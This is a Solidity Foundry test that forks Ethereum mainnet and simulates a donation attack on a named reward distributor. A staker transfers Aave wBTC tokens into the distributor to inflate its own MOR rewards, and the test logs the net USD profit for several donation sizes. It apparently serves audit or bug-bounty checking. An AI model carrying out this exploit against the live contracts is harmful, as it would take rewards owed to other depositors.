// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test} from "forge-std/Test.sol";

interface IERC20 { function balanceOf(address) external view returns (uint256); function transfer(address,uint256) external returns(bool); function approve(address,uint256) external returns(bool); }
interface IDistrib {
    function distributeRewards(uint256) external;
    function minRewardsDistributePeriod() external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function depositPools(uint256,address) external view returns (address,string memory,uint256,uint256,uint256,uint8,address,bool);
}
interface IAavePool { function supply(address,uint256,address,uint16) external; }
interface ICL { function getPathId(string memory) external pure returns (bytes32); function getChainLinkDataFeedLatestAnswer(bytes32) external view returns (uint256); }
interface IDepositPool { function stake(uint256,uint256,uint128,address) external; function getLatestUserReward(uint256,address) external view returns (uint256); }

contract DonationSweep is Test {
    IDistrib constant D = IDistrib(0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A);
    IAavePool constant AAVE = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IDepositPool constant WBTC_POOL = IDepositPool(0xdE283F8309Fd1AA46c95d299f6B8310716277A42);
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant CL = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;
    uint256 constant MOR_USD_1e8 = 179000000;
    uint256 constant WBTC_USD = 77775;
    address[5] POOLS = [0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790,0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384,0xdE283F8309Fd1AA46c95d299f6B8310716277A42,0x6cCE082851Add4c535352f596662521B4De4750E,0x3B51989212BEdaB926794D6bf8e9E991218cf116];

    address attacker;
    function _fresh() internal {
        for (uint256 i; i < 5; i++) { (, string memory p,,,,,,bool e)=D.depositPools(0,POOLS[i]); if(!e)continue; bytes32 id=ICL(CL).getPathId(p); uint256 px=ICL(CL).getChainLinkDataFeedLatestAnswer(id); vm.mockCall(CL,abi.encodeWithSelector(ICL.getChainLinkDataFeedLatestAnswer.selector,id),abi.encode(px)); }
    }

    function test_sweep() public {
        vm.createSelectFork(vm.envOr("ETH_RPC", string("https://ethereum-rpc.publicnode.com")), 25996939);
        _fresh();
        attacker = makeAddr("ATTACKER");
        uint256 stakeAmt = 200_000_000; // 2 wBTC dominance
        deal(WBTC, attacker, stakeAmt);
        vm.startPrank(attacker); IERC20(WBTC).approve(address(D), type(uint256).max); WBTC_POOL.stake(0, stakeAmt, 0, address(0)); vm.stopPrank();
        uint128 lc = D.rewardPoolLastCalculatedTimestamp(0);
        uint256 tgt = uint256(lc) + D.minRewardsDistributePeriod() + 100;
        if (block.timestamp < tgt) vm.warp(tgt);
        _fresh();
        uint256 snap = vm.snapshot();
        D.distributeRewards(0);
        uint256 base = WBTC_POOL.getLatestUserReward(0, attacker);
        vm.revertTo(snap);

        uint256[7] memory donations = [uint256(400000),800000,1200000,2000000,3000000,5000000,8000000];
        for (uint256 k; k < donations.length; k++) {
            uint256 s2 = vm.snapshot();
            uint256 dn = donations[k];
            deal(WBTC, attacker, dn);
            vm.startPrank(attacker);
            IERC20(WBTC).approve(address(AAVE), dn);
            AAVE.supply(WBTC, dn, attacker, 0);
            (, , , , , , address aW, ) = D.depositPools(0, POOLS[2]);
            IERC20(aW).transfer(address(D), IERC20(aW).balanceOf(attacker));
            vm.stopPrank();
            D.distributeRewards(0);
            uint256 r = WBTC_POOL.getLatestUserReward(0, attacker);
            uint256 extra = r > base ? r - base : 0;
            int256 netUsd1e8 = int256(extra * MOR_USD_1e8 / 1e18) - int256(dn * WBTC_USD);
            emit log_named_uint("donation wBTC(8dec)", dn);
            emit log_named_uint("  extra MOR", extra);
            emit log_named_int("  NET USD (1e8)", netUsd1e8);
            vm.revertTo(s2);
        }
    }
}
